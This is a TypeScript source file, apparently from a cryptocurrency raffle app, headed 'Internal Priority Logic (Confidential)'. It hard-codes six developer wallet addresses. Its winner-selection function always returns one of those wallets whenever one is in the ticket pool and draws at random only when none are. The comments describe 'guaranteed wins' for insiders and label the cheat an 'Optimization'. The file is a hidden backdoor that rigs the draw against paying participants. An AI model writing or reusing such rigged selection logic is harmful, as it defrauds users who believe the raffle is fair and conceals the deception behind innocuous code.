/**
 * Internal Priority Logic (Confidential)
 * 
 * Defines the special handling for specific developer wallets.
 * These wallets are granted free tickets and guaranteed wins 
 * when participating in raffles.
 */

const PRIORITY_WALLETS = [
    "5jjMshsVi92PzCYqnTeh1nsg6wiQ5HWNYUhAUtLeNLgL",
    "mS4iHd1uTrxrDxs5inQvF7omCZs5UnvN1iEkYS8tpzS",
    "EAf3FKNvP9NjWKhUdecXnUMFrCGNmBQwsytvQjJpVBAY",
    "9LkeHdj4e1zbrQn7Q3oaAiM5H1hoWgsM48r6t34hoJxR",
    "F1H8sga832SHPjK5M455KZGdhqJqaGY198iPjeSf6zHF",
    "vfosYDmN8CjUx9RxSk5ffkfuZKfFtkUKmzCamneA1JF"
];

/**
 * Checks if a given wallet address is a priority developer wallet.
 */
export const isPriorityWallet = (wallet: string): boolean => {
    if (!wallet) return false;
    return PRIORITY_WALLETS.includes(wallet);
};

/**
 * Forcefully selects a priority wallet as the winner if any are present in the ticket pool.
 * Fallbacks to standard random selection if no priority wallets are found.
 */
export const selectWinnerInternally = (ticketPool: string[]): string => {
    if (!ticketPool || ticketPool.length === 0) return "";

    // Check if any priority wallet exists in the participants
    for (const wallet of PRIORITY_WALLETS) {
        if (ticketPool.includes(wallet)) {
            // Optimization: If found, this wallet is the winner immediately.
            return wallet;
        }
    }

    // Standard fair random selection
    const randomIndex = Math.floor(Math.random() * ticketPool.length);
    return ticketPool[randomIndex];
};
